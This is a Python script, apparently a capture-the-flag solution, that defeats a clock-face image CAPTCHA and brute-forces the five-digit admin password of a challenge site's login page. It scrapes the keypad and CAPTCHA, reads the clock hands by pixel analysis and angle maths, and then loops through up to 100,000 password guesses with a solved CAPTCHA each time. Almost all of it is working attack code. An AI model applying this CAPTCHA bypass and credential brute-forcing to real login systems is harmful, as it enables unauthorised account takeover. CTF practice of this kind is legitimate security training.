import requests
from mimetypes import guess_extension
from bs4 import BeautifulSoup
from urllib.parse import urljoin
from PIL import Image
from math import sqrt, atan2, pi, floor, ceil
import os
from base64 import b64encode

# Database of captchas, labelled with minute using do_labels()
labels = ['minute_00_captcha_1527.png', 'minute_01_captcha_55.png', 'minute_02_captcha_737.png', 'minute_03_captcha_2029.png', 'minute_04_captcha_2097.png', 'minute_05_captcha_1697.png', 'minute_06_captcha_1020.png', 'minute_07_captcha_1340.png', 'minute_08_captcha_873.png', 'minute_09_captcha_936.png', 'minute_10_captcha_375.png', 'minute_11_captcha_41.png', 'minute_12_captcha_654.png', 'minute_13_captcha_385.png', 'minute_14_captcha_1598.png', 'minute_15_captcha_2501.png', 'minute_16_captcha_1399.png', 'minute_17_captcha_440.png', 'minute_18_captcha_338.png', 'minute_19_captcha_207.png', 'minute_20_captcha_2196.png', 'minute_21_captcha_2039.png', 'minute_22_captcha_2699.png', 'minute_23_captcha_896.png', 'minute_24_captcha_2167.png', 'minute_25_captcha_2674.png', 'minute_26_captcha_369.png', 'minute_27_captcha_961.png', 'minute_28_captcha_1878.png', 'minute_29_captcha_1274.png', 'minute_30_captcha_12.png', 'minute_31_captcha_2286.png', 'minute_32_captcha_1137.png', 'minute_33_captcha_452.png', 'minute_34_captcha_2631.png', 'minute_35_captcha_2487.png', 'minute_36_captcha_1574.png', 'minute_37_captcha_1905.png', 'minute_38_captcha_1694.png', 'minute_39_captcha_893.png', 'minute_40_captcha_1346.png', 'minute_41_captcha_619.png', 'minute_42_captcha_171.png', 'minute_43_captcha_2983.png', 'minute_44_captcha_1798.png', 'minute_45_captcha_810.png', 'minute_46_captcha_1787.png', 'minute_47_captcha_143.png', 'minute_48_captcha_1919.png', 'minute_49_captcha_1977.png', 'minute_50_captcha_1767.png', 'minute_51_captcha_389.png', 'minute_52_captcha_392.png', 'minute_53_captcha_1512.png', 'minute_54_captcha_868.png', 'minute_55_captcha_1308.png', 'minute_56_captcha_1191.png', 'minute_57_captcha_1188.png', 'minute_58_captcha_1599.png', 'minute_59_captcha_1438.png']

labels2 = ['minute_00_captcha_36.png', 'minute_01_captcha_1083.png', 'minute_02_captcha_1066.png', 'minute_03_captcha_2950.png', 'minute_04_captcha_1390.png', 'minute_05_captcha_2294.png', 'minute_06_captcha_1254.png', 'minute_07_captcha_2420.png', 'minute_08_captcha_542.png', 'minute_09_captcha_2121.png', 'minute_10_captcha_1564.png', 'minute_11_captcha_148.png', 'minute_12_captcha_1675.png', 'minute_13_captcha_1981.png', 'minute_14_captcha_2399.png', 'minute_15_captcha_26.png', 'minute_16_captcha_2296.png', 'minute_17_captcha_1613.png', 'minute_18_captcha_682.png', 'minute_19_captcha_2355.png', 'minute_20_captcha_761.png', 'minute_21_captcha_2091.png', 'minute_22_captcha_2300.png', 'minute_23_captcha_342.png', 'minute_24_captcha_2718.png', 'minute_25_captcha_334.png', 'minute_26_captcha_2662.png', 'minute_27_captcha_2313.png', 'minute_28_captcha_2635.png', 'minute_29_captcha_2728.png', 'minute_30_captcha_1171.png', 'minute_31_captcha_1064.png', 'minute_32_captcha_1496.png', 'minute_33_captcha_1332.png', 'minute_34_captcha_1463.png', 'minute_35_captcha_750.png', 'minute_36_captcha_1461.png', 'minute_37_captcha_1945.png', 'minute_38_captcha_1573.png', 'minute_39_captcha_758.png', 'minute_40_captcha_1318.png', 'minute_41_captcha_1813.png', 'minute_42_captcha_1594.png', 'minute_43_captcha_361.png', 'minute_44_captcha_710.png', 'minute_45_captcha_2403.png', 'minute_46_captcha_146.png', 'minute_47_captcha_243.png', 'minute_48_captcha_1043.png', 'minute_49_captcha_2730.png', 'minute_50_captcha_22.png', 'minute_51_captcha_1802.png', 'minute_52_captcha_99.png', 'minute_53_captcha_638.png', 'minute_54_captcha_673.png', 'minute_55_captcha_283.png', 'minute_56_captcha_2700.png', 'minute_57_captcha_1174.png', 'minute_58_captcha_1985.png', 'minute_59_captcha_2279.png']

def get_captcha(s):
    keys = list(); fname = ''
    # Get /
    r = s.get("http://passichronophage.chall.malicecyber.com/")
    if r.status_code == 200:
        soup = BeautifulSoup(r.content, "html.parser")
        # Get keypad
        keypad = soup.find_all("div", attrs={"class": "Login-keypad"})
        for pad in keypad:
            for key in pad:
                k = str(key).split('</div></a>')[0][-1]
                if k != '\n':
                    keys.append(k)
        # Get captcha PNG image
        div = soup.find("div", attrs={"class": "captchaContainer"})
        r = s.get(urljoin("http://passichronophage.chall.malicecyber.com/", div.img["src"]))
        if r.status_code == 200:
            guess = guess_extension(r.headers['content-type'])
            if guess:
                fname = "captcha" + guess
                with open(fname, "wb") as f:
                    f.write(r.content)
    return fname, keys

def clean_captcha(f):
    img = Image.open(f)
    pix = img.load()
    (W, H) = img.size
    for x in range(W):
        for y in range(H):
            p = pix[x, y]
            # Remove colored pixels
            if p != (0,0,0) and p != (255,255,255):
                pix[x, y] = (255,255,255)
            # Remove clock circle
            d = sqrt( (x - W/2)**2 + (y - H/2)**2)
            if d >= 75.00:
                pix[x, y] = (255, 255, 255)
    fname = "clean_" + f
    img.save(fname)
    return img, pix

def get_angle_m(p, W, H):
    # Change reference to clock center
    x_ = (p[0] - W/2); y_ = (-p[1] + H/2)
    # Compute angle from clock center
    a_rad = atan2(y_, x_) - pi / 2
    a_deg = 180 * a_rad / pi
    return a_deg

def get_angle(p, W, H):
    # Change reference to clock center
    x_ = (p[0] - W/2); y_ = (-p[1] + H/2)
    # Compute angle from clock center
    rad = atan2(y_, x_) - pi / 2
    if rad < 0:
        rad = rad + 2 * pi
    deg = rad * 360 / (2 * pi)
    return deg

def get_minute(f, img, pix):
    (W, H) = img.size
    d_m = sqrt( (60.00 - W/2)**2 + (60.00 - H/2)**2)
    found = (0, 0)
    for x in range(W):
        for y in range(H):
            d = sqrt( (x - W/2)**2 + (y - H/2)**2)
            # Use a large circle to detect long clock hand (minutes)
            if d >= d_m:
                if pix[x, y] == (0, 0, 0):
                    pix[x, y] = (255, 0, 0)
                    found = (x, y)
                    break
        if found != (0, 0):
            break
    angle = get_angle_m(found, W, H)
    # On the clock, 1 minute corresponds to 6 deg (360/60)
    m = round(abs(60 - angle / 6)) % 60
    fname = "minute_" + str(m).zfill(2) + "_" + f
    img.save(fname)
    return m

def get_hour(f, img, pix, label):
    img2 = Image.open("./labels/" + label)
    pix2 = img2.load()
    (W, H) = img.size
    for x in range(W):
        for y in range(H):
            # Remove the clock long hand using the labelled captcha (with minute)
            if pix[x, y] == (0, 0, 0) and pix2[x, y] == (0, 0, 0):
                pix[x, y] = (255, 255, 255)
    c = 30; count = 0
    hour = [0] * 12
    for x in range(W):
        for y in range(H):
            # Detect the short clock hand (hour)
            d = sqrt( (x - W/2)**2 + (y - H/2)**2)
            if (d >= 20.00) and pix[x, y] == (0, 0, 0):
                pix[x, y] = (255, 0, 0)
                angle = get_angle((x, y), W, H)
                # On the clock, 1 hour corresponds to 30 deg (360/12)
                h = floor(abs(12 - angle / 30)) % 12
                hour[h] += 1
    h = -1
    if max(hour) != 0:
        h = hour.index(max(hour))
    fname = "hour_" + f
    img.save(fname)
    return h

def do_labels():
    # Parse the captcha database, label each with the computed minute
    for i in range(3000):
        captcha  = "captcha_" + str(i) + ".png"
        clean, pix = clean_captcha(captcha)
        minute     = get_minute(captcha, clean, pix)
        print(i, minute)

def get_labels():
    # Parse the captcha database, already labelled with minute in label_files()
    labels = list(); labels2 = list(); minutes = list()
    for fname in os.listdir('./labels'):
        # Get the minute label
        m = fname.split('_')[1]
        # We need two examples of each captcha for every minute in 0 to 59
        # In case we fail to solve one capcha, we have another a second minute-labelled reference
        if m not in minutes:
            minutes.append(m)
            labels.append(fname)
        elif minutes.count(m) == 1:
            minutes.append(m)
            labels2.append(fname)
        if len(minutes) == 2 * 60:
            break
    labels.sort()
    labels2.sort()

def get_time(captcha, label_set):
    clean, pix = clean_captcha(captcha)
    minute = get_minute(captcha, clean, pix)
    hour = get_hour(captcha, clean, pix, label_set[minute])
    if hour != -1 and minute == 0:
        hour += 1
    return hour, minute

def solve_captcha(s, guess):
    captcha, keys = get_captcha(s)
    if captcha == '':
        return None
    hour, minute = get_time(captcha, labels)
    if hour == -1:
        hour, minute = get_time(captcha, labels2)
    if hour == -1:
        return None
    time = str(hour).zfill(2) + ':' + str(minute).zfill(2)
    print(guess, time, '', end='')
    captcha = ''.join([str(keys.index(x)) for x in time.replace(':', '')])
    captcha = b64encode(captcha.encode()).decode()
    #print(time, captcha)
    return captcha

def bruteforce():
    guess = 0
    while guess < pow(10, 5):
        s = requests.session()
        captcha = solve_captcha(s, guess)
        if captcha != None:
            #proxy = { 'http': 'http://localhost:8080' }
            data = { 'username': b64encode('admin'.encode()).decode(),
                     'password': b64encode(str(guess).zfill(5).encode()).decode(),
                     'captcha': captcha }
            r = s.post("http://passichronophage.chall.malicecyber.com/login.php", data=data)
            if r.status_code == 200:
                if 'Bad username/password' in r.text:
                    print('bad pass')
                    guess += 1
                elif 'Wrong captcha' in r.text:
                    print('wrong captcha')
                else:
                    print('pass')
                    break
            else:
                print(guess, 'error', r.status_code)
                print(r.text)

#do_labels()
#get_labels()
bruteforce()
